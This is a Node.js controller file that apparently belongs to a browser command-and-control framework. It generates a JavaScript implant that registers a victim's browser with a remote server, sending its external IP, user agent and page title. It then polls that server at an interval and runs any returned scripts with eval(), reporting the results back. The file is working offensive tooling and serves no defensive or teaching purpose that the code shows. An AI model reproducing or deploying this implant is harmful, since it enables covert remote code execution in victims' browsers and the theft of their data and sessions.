const Implant = require("../models/Implant");
const Payload = require("../models/Payload");
const { createEvent } = require("./eventControllers");

async function generateImplant(server, callbackInterval) {

    // Validate URI for server
    server = server.replace(/\/+$/, "");
    server = server.trim().replace(/\s/g, "");
    if(/^(:\/\/)/.test(server)){
        server = `http${server}`;
    }
    if(!/^(f|ht)tps?:\/\//i.test(server)){
        server = `http://${server}`;
    }

    // Minify this before production
    const template = `
    let commands = [];
    let data = {}
    let id = "";

    function setData(name, value, type) {
        data[name] = {"value": value, "type": type};
    }

    async function createHID() {
        fetch("${server}/register", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "externalIP": await fetch("https://api.ipify.org/?format=json").then((res) => res.json()).then((data) => {return data.ip}),
                "userAgent": navigator.userAgent,
                "currentTab": document.title,
                "associatedImplant": "%%IMPLANTID%%"
            })
        }).then(res => res.json()).then(responseData => {
            localStorage.setItem("HID", responseData.id);
            if(responseData.initialPayload && responseData.initialPayload.payload !== "") {
                try {
                    eval(responseData.initialPayload.payload);
                    commands.push({
                        id: responseData.initialPayload.id,
                        name: responseData.initialPayload.name,
                        author: "Implant %%IMPLANTID%%",
                        status: "success",
                        data: JSON.stringify(data)
                    });
                } catch (error) {
                    commands.push({
                        id: responseData.initialPayload.id,
                        name: responseData.initialPayload.name,
                        author: "Implant %%IMPLANTID%%",
                        status: "error",
                        data: {
                            message: error.message
                        }
                    })
                }
                
            }
        });
    }
    
    async function poll() {
        if(localStorage.getItem("HID") == null || localStorage.getItem("HID") == undefined) {
            createHID();
        } else {
            id = localStorage.getItem("HID");
        }

        if (id && id !== "undefined") {
            try {
                await fetch(\`${server}/\${id}\`, {
                    method: "POST",
                    cache: "no-cache",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        commands: commands
                    }),
                }).then(response => response.json().then(responseData => {
                    commands = [];
                    responseData.forEach((payload) => {
                        data = {}
                        const script = payload.script
                        try {
                            if (script.toUpperCase().includes("ALERT")) { // Stops alert hanging the page
                                setTimeout(function () {
                                    eval(script);
                                }, 1);
                            } else {
                                eval(script);
                            }
                            commands.push({
                                id: payload.id,
                                name: payload.name,
                                author: payload.author,
                                status: "success",
                                data: JSON.stringify(data)
                            });
                        } catch (error) {
                            commands.push({
                                id: payload.id,
                                name: payload.name,
                                author: payload.author,
                                status: "error",
                                data: {
                                    message: error.message
                                }
                            })
                        }
                    });
                }));
            } catch (error) {
                localStorage.removeItem("HID");
            }
        }
    }
    setInterval(poll, ${callbackInterval});
    poll();
`
    try {
        const implant = await Implant.create({
            server: server,
            payload: template,
            callbackInterval: callbackInterval,
            initialPayload: {name: "", payload: ""}
        })
        createEvent("Team Server", `Implant ${implant._id} created`, "info");
        return implant._id.toString();

    } catch (err) {
        return err;
    }
}

async function getImplantById(id) {
    try {
        const implant = await Implant.findById(id);
        return implant.payload;
    } catch (err) {
        return err;
    }
}

async function getAllImplants(req, res) {
    try {
        const implants = await Implant.find();
        res.status(200).json(implants);
    } catch (err) {
        res.status(400).json(err);
    }
}

async function deleteImplantById(req, res) {
    try {
        const implant = await Implant.findByIdAndDelete(req.params.id);
        res.status(200).json(implant);
    } catch (err) {
        res.status(400).json(err);
    }
}

async function updateImplantInitialPayloadById(req, res) {    
    Payload.findById(req.body.initialPayload).then((payload) => {
        Implant.findByIdAndUpdate(req.params.id, {initialPayload: {id: payload._id.toString(), name: payload.name, payload: payload.payload}}).then((implant) => {
            createEvent("Team Server", `Implant ${implant._id.toString()} was updated`, 'info');
            res.status(200).json(implant);
        }).catch((err) => {
            res.status(400).json(err);
        });
    }).catch((err) => {
        res.status(400).json(err);
    });
}

module.exports = {
    generateImplant,
    getImplantById,
    getAllImplants,
    deleteImplantById,
    updateImplantInitialPayloadById
};